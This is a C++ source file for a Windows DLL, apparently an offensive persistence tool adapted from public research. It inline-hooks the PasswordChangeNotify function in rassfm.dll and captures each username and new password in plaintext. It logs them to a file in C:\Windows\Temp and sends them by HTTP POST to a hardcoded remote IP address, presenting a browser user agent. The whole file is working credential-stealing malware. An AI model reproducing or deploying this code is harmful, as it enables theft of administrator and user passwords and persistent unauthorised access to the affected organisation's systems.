// HookPasswordChange.cpp : Defines the exported functions for the DLL application.
//

/*
	The tool implements permission persistence through HOOK PasswordChangeNotify. Modified based on the original HookPasswordChange to add a simple 
	HTTP request functionality via the WinINet API. When the administrator modifies the password, the user password will be transmitted to the remote 
	server via the HTTP POST method.
	
	Please see my blog at clymb3r.wordpress.com for more information.

	http://clymb3r.wordpress.com/2013/09/15/intercepting-password-changes-with-function-hooking/
	http://carnal0wnage.attackresearch.com/2013/09/stealing-passwords-every-time-they.html
	https://github.com/clymb3r/Misc-Windows-Hacking
*/

#include "pch.h"
#include "HookPasswordChange.h"

using namespace std;
#pragma comment( lib, "Wininet.lib" )
#define PTRSIZE sizeof(PVOID)

BYTE* PtrToLittleEndianByteArray(PVOID ptr);
void WriteVectorToAddress(vector<BYTE> bytes, PVOID address);

//Hook function definition
NTSTATUS PasswordChangeNotifyHook(
	PUNICODE_STRING UserName,
	ULONG RelativeId,
	PUNICODE_STRING NewPassword);


typedef NTSTATUS(*PasswordChangeNotifyHookReturn)(PUNICODE_STRING, ULONG, PUNICODE_STRING);
PasswordChangeNotifyHookReturn HookReturnFunc;

bool Hook_rassfm_PasswordChangeNotify();


void VoidFunc()
{
	InitHooking();
}


void InitHooking()
{
	Hook_rassfm_PasswordChangeNotify();
}


//Hook the PasswordChangeNotify function in rassfm.dll, one of the standard Windows password change validation libraries
// THIS IS ONLY TESTED FOR X64, ALMOST CERTAINLY WON'T WORK FOR X86
bool Hook_rassfm_PasswordChangeNotify()
{
	HMODULE hRassfm = GetModuleHandleA("rassfm");
	if (!hRassfm)
	{
		return false;
	}

	FARPROC PasswordChangeNotifyAddr = GetProcAddress(hRassfm, "PasswordChangeNotify");
	if (!PasswordChangeNotifyAddr)
	{
		return false;
	}

	//1. First create an inline hook in PasswordChangeNotify to redirect flow to PasswordChangeNotifyHook
	vector<BYTE> funcOverwrite;
	BYTE funcOverwrite1[] = { 0x48, 0xb8 }; //mov rax, ADDRESS
	funcOverwrite.insert(funcOverwrite.end(), funcOverwrite1, funcOverwrite1 + 2);
	BYTE* funcOverwrite2 = PtrToLittleEndianByteArray(&PasswordChangeNotifyHook); //Address of PasswordChangeNotifyHook function
	funcOverwrite.insert(funcOverwrite.end(), funcOverwrite2, funcOverwrite2 + PTRSIZE);
	BYTE funcOverwrite3[] = { 0xff, 0xe0 }; // jmp rax
	funcOverwrite.insert(funcOverwrite.end(), funcOverwrite3, funcOverwrite3 + 2);

	DWORD oldProtect = 0;
	VirtualProtect(PasswordChangeNotifyAddr, 50, PAGE_EXECUTE_READWRITE, &oldProtect);
	WriteVectorToAddress(funcOverwrite, PasswordChangeNotifyAddr);
	VirtualProtect(PasswordChangeNotifyAddr, 50, oldProtect, &oldProtect);

	delete[] funcOverwrite2;


	//2. Write bytecode to memory which will execute the instructions that were overwritten in PasswordChangeNotify and return execution to PasswordChangeNotify+0xf with a jmp
	vector<BYTE> hookReturnBytes;
	BYTE hookReturnBytes1[] = { 0x48, 0x89, 0x5c, 0x24, 0x08 };	//mov	qword ptr [rsp+8],rbx
	hookReturnBytes.insert(hookReturnBytes.end(), hookReturnBytes1, hookReturnBytes1 + 5);
	BYTE hookReturnBytes2[] = { 0x48, 0x89, 0x6c, 0x24, 0x10 };	//mov	qword ptr [rsp+10h],rbp
	hookReturnBytes.insert(hookReturnBytes.end(), hookReturnBytes2, hookReturnBytes2 + 5);
	BYTE hookReturnBytes3[] = { 0x48, 0x89, 0x74, 0x24, 0x20 };	//mov	qword ptr [rsp+20h],rsi
	hookReturnBytes.insert(hookReturnBytes.end(), hookReturnBytes3, hookReturnBytes3 + 5);
	BYTE hookReturnBytes4[] = { 0x48, 0xb8 };						//mov	rax, ADDRESS_OF_PasswordChangeNotify
	hookReturnBytes.insert(hookReturnBytes.end(), hookReturnBytes4, hookReturnBytes4 + 2);
	BYTE* hookReturnBytes5 = PtrToLittleEndianByteArray((PVOID)((UINT64)PasswordChangeNotifyAddr + 15)); //Address of PasswordChangeNotifyHook function at an offset of 15 since we overwrite the first 3 instructions with the inline hook and are rewriting them with this byte code
	hookReturnBytes.insert(hookReturnBytes.end(), hookReturnBytes5, hookReturnBytes5 + PTRSIZE);
	BYTE hookReturnBytes6[] = { 0xff, 0xe0 };						//jmp	rax
	hookReturnBytes.insert(hookReturnBytes.end(), hookReturnBytes6, hookReturnBytes6 + 2);

	LPVOID hookReturnAddress = VirtualAlloc(NULL, 100, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	WriteVectorToAddress(hookReturnBytes, hookReturnAddress);
	VirtualProtect(hookReturnAddress, 100, PAGE_EXECUTE_READ, NULL);
	HookReturnFunc = (PasswordChangeNotifyHookReturn)hookReturnAddress;

	delete[] hookReturnBytes5;

	return true;
}




NTSTATUS PasswordChangeNotifyHook(
	PUNICODE_STRING UserName,
	ULONG RelativeId,
	PUNICODE_STRING NewPassword)
{
	if (UserName != NULL && NewPassword != NULL)
	{
		//UNICODE_STRING is not guaranteed to be null terminated so copy it in to a new buffer and null terminate it
		int userNameLength = (UserName->Length / 2) + 2;
		wchar_t* userName = new wchar_t[userNameLength];
		memcpy(userName, UserName->Buffer, UserName->Length);
		memset(userName + userNameLength - 2, 0, 2);

		int passwordLength = (NewPassword->Length / 2) + 2;
		wchar_t* password = new wchar_t[passwordLength];
		memcpy(password, NewPassword->Buffer, NewPassword->Length);
		memset(password + passwordLength - 2, 0, 2);

		wofstream outFile;
		outFile.open("C:\\Windows\\Temp\\Passwords.txt", ios::app);
		if (outFile.is_open())
		{
			outFile << wstring(userName) << L"\\" << wstring(password) << endl;
			outFile.close();
		}
		
		HINTERNET hInternet = InternetOpen(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.81 Safari/537.36", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
		if (hInternet == NULL)
		{
			InternetCloseHandle(hInternet);
		}

		HINTERNET hSession = InternetConnect(hInternet, L"47.117.125.220", 2333, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
		if (hSession == NULL)
		{
			InternetCloseHandle(hSession);
			InternetCloseHandle(hInternet);
		}

		char strUserName[128];
		char strPassWord[128];
		WideCharToMultiByte(CP_ACP, 0, userName, -1, strUserName, sizeof(strUserName), NULL, NULL);
		WideCharToMultiByte(CP_ACP, 0, password, -1, strPassWord, sizeof(strPassWord), NULL, NULL);
		char Credential[128];
		snprintf(Credential, sizeof(Credential), "username=%s&password=%s", strUserName, strPassWord);
		
		HINTERNET hRequest = HttpOpenRequest(hSession, L"POST", L"/", NULL, NULL, NULL, 0, 0);
		TCHAR ContentType[] = L"Content-Type: application/x-www-form-urlencoded";
		HttpAddRequestHeaders(hRequest, ContentType, -1, HTTP_ADDREQ_FLAG_ADD | HTTP_ADDREQ_FLAG_REPLACE);
		HttpSendRequest(hRequest, NULL, 0, Credential, strlen(Credential));
	}

	//Return control flow back to the original PasswordChangeNotify function
	return HookReturnFunc(UserName, RelativeId, NewPassword);
}


//The value returned by this function must be freed
BYTE* PtrToLittleEndianByteArray(PVOID ptr)
{
	if (!ptr)
	{
		return NULL;
	}

	int ptrSize = sizeof(ptr);
	BYTE* retVal = new BYTE[ptrSize];

	for (int i = 0; i < ptrSize; i++)
	{
		retVal[i] = (UINT64)ptr >> (i * 8);
	}

	return retVal;
}

void WriteVectorToAddress(vector<BYTE> bytes, PVOID address)
{
	size_t length = bytes.size();
	memcpy(address, &bytes[0], length);
}
